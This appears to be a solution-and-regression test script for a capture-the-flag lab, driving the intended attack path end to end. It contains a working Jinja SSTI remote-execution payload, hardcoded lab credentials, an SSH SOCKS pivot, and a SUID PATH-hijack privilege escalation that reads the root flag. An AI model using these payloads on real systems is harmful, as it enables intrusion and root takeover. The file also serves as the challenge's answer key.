#!/usr/bin/env bash
# ============================================================================
#  solve.sh — automated golden-path regression test for the Ambiorix CTF.
#
#  Drives the FULL intended solution from inside the attacker container and
#  asserts the flag is recovered. Run after `docker compose up -d --build`.
#
#  Usage:
#     ./test/solve.sh
#     COMPOSE="podman-compose" ./test/solve.sh      # alternate compose tool
# ============================================================================
set -u

COMPOSE="${COMPOSE:-docker compose}"
EXEC() { $COMPOSE exec -T attacker "$@"; }

PIVOT=172.20.0.10
TARGET=10.10.10.10
EXPECTED='flag{atuatuca_ambush_54bc}'

WEB_USER=tiro;   WEB_PASS='AveLegioXIV-54'
SCOUT_PASS='FrontierWatch-54BC'
EBURO_PASS='ArduennaShadow'

SSHOPTS='-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR'

say() { printf '\n\033[1;33m[*] %s\033[0m\n' "$1"; }
ok()  { printf '\033[1;32m    OK: %s\033[0m\n' "$1"; }
die() { printf '\033[1;31m[!] FAIL: %s\033[0m\n' "$1"; cleanup; exit 1; }

cleanup() { EXEC pkill -f 'ssh.*-D 1080' >/dev/null 2>&1 || true; }
trap cleanup EXIT

# ----------------------------------------------------------------------------
say "Stage 0 — isolation invariant: attacker must NOT reach the target directly"
if EXEC ping -c1 -W2 "$TARGET" >/dev/null 2>&1; then
  die "attacker reached $TARGET directly — the pivot is not enforced!"
fi
ok "target $TARGET is unreachable from the frontier (as intended)"

# ----------------------------------------------------------------------------
say "Stage 1 — foothold: log in + SSTI RCE -> recover scout SSH creds"
SSTI='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
EXEC bash -c "
  C=/tmp/jar_solve
  curl -s -c \$C -b \$C -d 'username=$WEB_USER&password=$WEB_PASS' http://$PIVOT/login -o /dev/null
  curl -s -c \$C -b \$C --data-urlencode 'report=' --data-urlencode 'sigil=$SSTI' http://$PIVOT/board
" | grep -q "scout / $SCOUT_PASS" || die "SSTI RCE did not return the scout creds"
ok "SSTI RCE works; deploy notes leak scout / $SCOUT_PASS + inner host $TARGET"

# ----------------------------------------------------------------------------
say "Stage 2 — pivot: read muster roll, then open an SSH -D SOCKS tunnel"
EXEC bash -c "SSHPASS='$SCOUT_PASS' sshpass -e ssh $SSHOPTS scout@$PIVOT 'cat ~/muster.txt'" \
  | grep -q "eburo / $EBURO_PASS" || die "could not read the inner-camp creds from scout's home"
ok "muster roll leaks eburo / $EBURO_PASS"

cleanup; sleep 1
# Hold the SSH dynamic forward open in a SEPARATE, host-side backgrounded exec.
# This keeps the long-running tunnel out of the capture session below, which is
# what makes it robust under both `docker compose` and `podman-compose` exec.
$COMPOSE exec -T attacker \
  bash -c "SSHPASS='$SCOUT_PASS' exec sshpass -e ssh $SSHOPTS -N -D 1080 scout@$PIVOT" \
  >/dev/null 2>&1 &
TUN_HOST_PID=$!
sleep 4
EXEC bash -c "ss -tln 2>/dev/null | grep -q ':1080 '" \
  || die "SOCKS tunnel on :1080 did not come up"
ok "SSH -D 1080 tunnel through castra is up (proxychains -> socks5 127.0.0.1:1080)"

# ----------------------------------------------------------------------------
say "Stage 3 — inner objective: proxychains to target, SUID PATH-hijack privesc"
# Plant a shebang-less 'date' script (run by /bin/sh inside the SUID binary);
# PATH hijack makes castellum execute it as root -> it cats the flag.
RCMD='cd /tmp && echo "cat /root/flag.txt" > date && chmod +x date && PATH=/tmp:$PATH /usr/local/bin/castellum'
FLAG=$(EXEC bash -c "SSHPASS='$EBURO_PASS' proxychains4 -q sshpass -e ssh $SSHOPTS eburo@$TARGET '$RCMD'" 2>/dev/null \
       | grep -o 'flag{[^}]*}' | head -1)

kill "$TUN_HOST_PID" 2>/dev/null || true

# ----------------------------------------------------------------------------
say "Result"
echo "    recovered: '${FLAG:-<none>}'"
[ "${FLAG:-}" = "$EXPECTED" ] || die "flag mismatch (got '${FLAG:-<none>}', want '$EXPECTED')"
ok "golden path solved end-to-end — $EXPECTED"
printf '\n\033[1;32m==== PASS ====\033[0m\n'
